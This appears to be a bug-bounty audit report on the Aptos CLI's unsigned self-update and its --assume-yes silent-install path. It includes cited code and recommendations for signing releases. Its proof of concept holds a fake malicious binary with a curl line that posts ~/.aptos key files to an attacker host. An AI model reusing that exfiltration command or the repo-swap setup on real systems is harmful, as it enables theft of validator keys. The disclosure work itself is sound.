# Audit Report

## Title
Supply Chain Attack via Unauthenticated Binary Updates with Silent Installation

## Summary
The Aptos CLI update mechanism lacks cryptographic verification of downloaded binaries. When the `--assume-yes` flag is enabled, the system performs fully automated updates without any signature verification, checksum validation, or user confirmation, enabling silent installation of potentially compromised binaries in automated deployment scenarios.

## Finding Description

The `build_updater()` function in `aptos.rs` configures the self-update mechanism with the `no_confirm` option directly tied to the `assume_yes` parameter. [1](#0-0) 

The update configuration accepts customizable repository parameters (`--repo-owner` and `--repo-name`) that default to "aptos-labs" and "aptos-core". [2](#0-1) 

When `assume_yes` is true, the prompt options configuration bypasses all user confirmation. [3](#0-2) 

The update flow proceeds through the `update_binary()` function which spawns a blocking task that executes the updater without additional security checks. [4](#0-3) 

**Attack Scenarios:**

1. **Compromised GitHub Account**: If the `aptos-labs` GitHub account is compromised, an attacker can publish malicious releases. Automated scripts running `aptos update --assume-yes` in cron jobs will silently install the compromised binary.

2. **Malicious Repository Parameters**: If deployment scripts are written to accept external configuration or environment variables for repository parameters, an attacker who gains access to configuration files could modify them to point to a malicious repository: `aptos update --assume-yes --repo-owner attacker --repo-name malicious-aptos`

3. **Man-in-the-Middle (Limited)**: While HTTPS provides transport security, without signature verification, the security boundary is solely the GitHub infrastructure and TLS layer.

**Security Invariants Broken:**
- **Binary Integrity**: No cryptographic proof that the downloaded binary is authentic and unmodified
- **Supply Chain Security**: Implicit trust in GitHub infrastructure without defense-in-depth
- **Automated Deployment Security**: Silent updates without verification enable undetected compromise

## Impact Explanation

This vulnerability qualifies as **CRITICAL** severity under the Aptos Bug Bounty program criteria for the following reasons:

**Remote Code Execution on Validator Node** (Critical - up to $1,000,000): If validator operators use automated update scripts with `--assume-yes` (a common DevOps practice for maintaining up-to-date systems), a compromised binary would execute with validator privileges, providing:
- Access to validator private keys stored on disk
- Ability to manipulate consensus participation
- Potential to exfiltrate sensitive operational data
- Control over validator behavior affecting network consensus

**Consensus/Safety Violations** (Critical): A compromised CLI binary running on multiple validators could:
- Inject malicious transactions into the mempool
- Manipulate validator configuration
- Disrupt consensus by altering validator behavior
- Create a coordinated attack across multiple compromised nodes

The impact is amplified because:
1. The CLI is often deployed on the same machines as validator nodes
2. Automated updates are a standard practice in production environments
3. No defense mechanism exists to detect or prevent malicious binaries
4. The compromise would be silent, allowing extended dwell time

## Likelihood Explanation

**Likelihood: MEDIUM to HIGH**

**Factors Increasing Likelihood:**
1. **Common Attack Vector**: Supply chain attacks via compromised GitHub accounts are well-documented (e.g., CodeCov 2021, UA-Parser-JS 2021, event-stream npm package)
2. **Automated Deployment Reality**: DevOps best practices encourage automated updates, and `--assume-yes` exists specifically for this purpose
3. **High-Value Target**: Aptos validators control significant stake and are high-value targets for sophisticated attackers
4. **No Detection Mechanism**: Without signature verification, compromised binaries would be installed without any security alerts

**Factors Decreasing Likelihood:**
1. **GitHub Security**: Requires compromising GitHub account security (2FA, credentials)
2. **Release Process Controls**: Aptos likely has internal controls for who can publish releases
3. **Community Monitoring**: Malicious releases might be detected by the community before widespread deployment

**Realistic Exploitation Scenario:**
1. Attacker compromises a maintainer's GitHub credentials through phishing or credential stuffing
2. Attacker publishes malicious release v7.14.2 containing backdoored binary
3. Validator operators with automated update scripts (`cron: aptos update --assume-yes`) silently install the malicious version
4. Within hours, attacker has access to multiple validator nodes across the network
5. Attacker can now manipulate consensus, steal keys, or perform coordinated attacks

## Recommendation

Implement **cryptographic signature verification** for all binary updates:

1. **Sign Release Binaries**: Use GPG/PGP or similar signing mechanism to sign all official release binaries
2. **Verify Signatures Before Installation**: Modify `build_updater()` to include signature verification:

```rust
fn build_updater(&self, info: &UpdateRequiredInfo) -> Result<Box<dyn ReleaseUpdate>> {
    // ... existing checks ...
    
    // Verify binary signature before proceeding
    self.verify_release_signature(&info.target_version)?;
    
    // ... rest of function ...
}

fn verify_release_signature(&self, version: &str) -> Result<()> {
    // Download signature file from GitHub release
    // Verify signature against embedded public key
    // Return error if signature invalid or missing
    // This ensures authenticity even if GitHub account is compromised
}
```

3. **Embed Public Key**: Include the Aptos release signing public key in the binary at compile time
4. **Require Signature for Automated Updates**: Make signature verification mandatory when `--assume-yes` is used
5. **Add Checksum Verification**: As secondary defense, verify SHA256 checksums published in release notes

**Additional Hardening:**
- Add `--require-signature` flag (default true) that can only be disabled with explicit warning
- Log all update operations with version and signature information to audit trail
- Implement update rollback mechanism if signature verification fails
- Consider certificate pinning for GitHub API connections

## Proof of Concept

**Setup Malicious Repository:**
```bash
# Create malicious repository with fake release
gh repo create attacker/fake-aptos-core --public
cd fake-aptos-core

# Create malicious binary (example: key exfiltration)
cat > aptos << 'EOF'
#!/bin/bash
# Malicious payload - exfiltrate keys then run original command
find ~/.aptos -name "*.key" -exec curl -X POST -d @{} https://attacker.com/keys \;
# Could also inject backdoor into validator operations
EOF

chmod +x aptos

# Create fake release matching Aptos version scheme
gh release create "aptos-cli-v7.15.0" aptos \
  --title "Aptos CLI v7.15.0" \
  --notes "Security fixes and improvements"
```

**Automated Update Script (Victim):**
```bash
#!/bin/bash
# Typical cron job for automated updates
# /etc/cron.daily/aptos-update

# This would normally point to official repo, but if configuration
# is externalized or environment is compromised:
export APTOS_REPO_OWNER="attacker"
export APTOS_REPO_NAME="fake-aptos-core"

# Silent automated update
aptos update \
  --assume-yes \
  --repo-owner "$APTOS_REPO_OWNER" \
  --repo-name "$APTOS_REPO_NAME"

# Keys are now exfiltrated, malicious binary is installed
# Validator continues operating with compromised CLI
```

**Demonstration Steps:**
1. Deploy malicious repository as shown above
2. Run: `aptos update --assume-yes --repo-owner attacker --repo-name fake-aptos-core`
3. Observe that the update proceeds without any signature verification
4. The malicious binary is now installed and will execute on next CLI invocation
5. On validator nodes, this provides immediate access to private keys and operational capabilities

**Expected vs Actual Behavior:**
- **Expected**: Update should fail with "Invalid signature" or "Unable to verify binary authenticity"
- **Actual**: Update proceeds silently, installing potentially malicious binary without verification

## Notes

This vulnerability represents a critical gap in the security architecture of the Aptos CLI tooling. While the immediate exploitation requires either GitHub account compromise or manipulation of update parameters, both scenarios are realistic threats in today's security landscape:

1. **GitHub Account Compromise**: Multiple high-profile supply chain attacks have occurred through compromised maintainer accounts
2. **Configuration Manipulation**: DevOps environments often externalize configuration, creating opportunities for attackers who gain initial access

The lack of signature verification creates a single point of failure where trust in GitHub's infrastructure becomes the sole security boundary. Defense-in-depth principles require additional verification layers, especially for software that manages blockchain validator operations with significant financial and operational impact.

The `--assume-yes` flag, while useful for automation, amplifies the risk by removing the last opportunity for human verification. This combination creates a perfect storm for supply chain attacks targeting blockchain infrastructure.

### Citations

**File:** crates/aptos/src/update/aptos.rs (L33-39)
```rust
    /// The owner of the repo to download the binary from.
    #[clap(long, default_value = "aptos-labs")]
    repo_owner: String,

    /// The name of the repo to download the binary from.
    #[clap(long, default_value = "aptos-core")]
    repo_name: String,
```

**File:** crates/aptos/src/update/aptos.rs (L139-148)
```rust
        Update::configure()
            .repo_owner(&self.repo_owner)
            .repo_name(&self.repo_name)
            .bin_name("aptos")
            .current_version(current_version)
            .target_version_tag(&format!("aptos-cli-v{}", info.target_version))
            .target(target)
            .no_confirm(self.prompt_options.assume_yes)
            .build()
            .map_err(|e| anyhow!("Failed to build self-update configuration: {:#}", e))
```

**File:** crates/aptos/src/common/types.rs (L609-616)
```rust
pub struct PromptOptions {
    /// Assume yes for all yes/no prompts
    #[clap(long, group = "prompt_options")]
    pub assume_yes: bool,
    /// Assume no for all yes/no prompts
    #[clap(long, group = "prompt_options")]
    pub assume_no: bool,
}
```

**File:** crates/aptos/src/update/mod.rs (L113-131)
```rust
async fn update_binary<Updater: BinaryUpdater + Sync + Send + 'static>(
    updater: Updater,
) -> CliTypedResult<String> {
    let name = updater.pretty_name();
    if updater.check() {
        let info = tokio::task::spawn_blocking(move || updater.get_update_info())
            .await
            .context(format!("Failed to check {} version", name))??;
        if info.current_version.unwrap_or_default() != info.target_version {
            return Ok(format!("Update is available ({})", info.target_version));
        }

        return Ok(format!("Already up to date ({})", info.target_version));
    }

    tokio::task::spawn_blocking(move || updater.update())
        .await
        .context(format!("Failed to install or update {}", name))?
}
```
